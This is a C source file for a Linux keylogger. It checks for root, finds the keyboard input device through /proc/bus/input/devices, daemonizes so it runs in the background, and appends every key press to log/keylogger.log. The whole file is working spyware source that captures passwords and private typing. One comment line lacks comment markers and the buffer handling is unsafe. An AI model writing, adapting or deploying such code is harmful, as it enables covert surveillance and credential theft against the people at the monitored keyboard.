#include <stdio.h>
#include <fcntl.h>   //open
#include <stdlib.h>
#include <string.h>  //strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  //daemon, close
#include <linux/input.h>

#include "key_util.h"
#include "util.h"
#include "config.h"

#define KEY_RELEASE 0
#define KEY_PRESS 1

typedef struct input_event input_event;

int main(int argc, char **argv) {
    Check for root privileges
    if (geteuid() != 0) {
        printf("Must run as root! Exiting... \n");
        exit(-1);
    }

   Config config;
    /*Retrieve keyboard device file*/
    static const char *command =
    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
    "grep -B1 120013 |"
    "grep -Eo event[0-9]+ |"
    "tr '\\n' '\\0'";
    
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        printf("Could not determine keyboard device file \nExiting...");
        exit(-1);
    }
    char result[20] = "/dev/input/";
    char temp[9];
    fgets(temp, 9, pipe);
    pclose(pipe);
    config.device_file = strcat(result, temp);
    
    /*Open keyboard device file*/
    int kb_fd = open(config.device_file, O_RDONLY);
    if (kb_fd == -1) {
        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
        exit(-1);
    }
   assert(kb_fd > 0);
    
    /*Open log file*/
   FILE *log_file = fopen("log/keylogger.log", "a");
   if (log_file == NULL) {
      printf("Could not open log file. \nExiting...");
      exit(-1);
   }

   /*Disable buffering to write on every KEY_PRESS*/
   setbuf(log_file, NULL);

   /*Daemonize process by redirecting stdin and stdout to /dev/null*/
  // assert(daemon(1, 0) == -1);
    if (daemon(1, 0) == -1) {
      printf("Could not daemonize. \nError: %s. \nExiting...", strerror(errno));
      exit(-1);
   }
    /*If input event is KEY_PRESS, check for shift and print currrent character input */
   int shift_pressed = 0;
   input_event event;
   while (read(kb_fd, &event, sizeof(input_event)) > 0) {
      if (event.type == EV_KEY) {
         if (event.value == KEY_PRESS) {
            if (is_shift(event.code)) {
               shift_pressed++;
            }
            char *name = get_key_text(event.code, shift_pressed);
            if (strcmp(name, "\0") != 0) {
               fprintf(log_file, "%s",name);
            }
         } else if (event.value == KEY_RELEASE) {
            if (is_shift(event.code)) {
               shift_pressed--;
            }
         }
      }
      assert(shift_pressed >= 0 && shift_pressed <= 2);
   }

   config_cleanup(&config);
   fclose(log_file);
   close(kb_fd);
   return 0;
}
